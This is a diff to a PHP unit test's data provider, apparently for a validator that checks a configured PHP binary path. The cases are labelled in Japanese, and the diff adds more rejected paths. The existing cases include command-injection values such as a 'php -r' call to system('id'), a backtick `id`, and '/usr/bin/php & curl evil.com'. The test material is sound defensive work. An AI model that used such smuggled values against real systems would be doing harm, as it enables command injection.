@@ -604,6 +604,11 @@ EOF;
             'スペース付き' => ['/usr/local/bin/php -r "system(\'id\')"'],
             'アンパサンド付き' => ['/usr/bin/php & curl evil.com'],
             'バッククォート付き' => ['`id`'],
+            // 文字種は妥当だが php 以外の実行ファイル（basename 検証）
+            'php 以外の実行ファイル' => ['/usr/bin/curl'],
+            '相対パスの別コマンド' => ['bin/cake'],
+            'php で始まらないファイル名' => ['/usr/local/bin/myphp'],
+            'php の後に不正な文字' => ['/usr/bin/php-evil'],
         ];
     }
 
